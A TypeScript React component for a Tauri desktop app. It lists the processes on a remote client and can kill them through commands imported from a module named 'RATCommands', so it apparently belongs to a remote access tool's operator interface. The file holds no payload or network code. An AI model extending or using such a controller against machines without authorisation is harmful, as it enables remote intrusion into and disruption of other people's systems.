import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import { ProcessType } from "../../types";
import { processListCmd, killProcessCmd } from "../rat/RATCommands";

export const ProcessList: React.FC = () => {
  const { id } = useParams();
  const [processes, setProcesses] = useState<ProcessType[] | null>(null);
  const [processFilter, setProcessFilter] = useState("");

  async function waitProcessList() {
    listen("process_list", (event: any) => {
      const parsedProcesses = event.payload.processes.map(
        (process: { pid: number; name: string }) => ({
          pid: process.pid.toString(),
          name: process.name,
        })
      );
  
      parsedProcesses.sort((a: any, b: any) => {
        return parseInt(a.pid) - parseInt(b.pid);
      });
  
      setProcesses(parsedProcesses);
    });
  }
  
  // TODO: sorting by name and pid

  async function fetchProcessList() {
    await processListCmd(id);
  }

  useEffect(() => {
    waitProcessList();
    fetchProcessList();
  }, []);

  return (
    <div className="p-8 flex flex-1 flex-col overflow-auto w-full">
      <div className="flex flex-row gap-4 pb-4 w-[30%]">
        <a className="btn btn-active" onClick={fetchProcessList}>
          <i className="ri-refresh-fill ri-2x"></i>
          Refresh
        </a>
        <div>
          <label className="input input-bordered flex items-center gap-2 w-[100%]">
            Process Name
            <input
              value={processFilter}
              onChange={(e) => setProcessFilter(e.target.value)}
              type="text"
              className="grow"
              placeholder="Process name"
            />
          </label>
        </div>
      </div>
      <div className="overflow-x-auto">
        <table className="table table-zebra">
          <thead>
            <tr>
              <th>PID</th>
              <th>Process Name</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {processes && processes.length > 0 && (
              <>
                {processes.map((process, index) => {
                  if (
                    processFilter &&
                    !process.name
                      .toLowerCase()
                      .includes(processFilter.toLowerCase())
                  )
                    return null;
                  return (
                    <tr key={index}>
                      <td>{process.pid}</td>
                      <td>{process.name}</td>
                      <td>
                        <button
                          className="btn btn-active no-animation"
                          onClick={() =>
                            killProcessCmd(
                              id,
                              parseInt(process.pid),
                              process.name
                            )
                          }
                        >
                          <i
                            className="ri-close-line"
                            style={{ color: "red" }}
                          ></i>
                          Kill Process
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
};
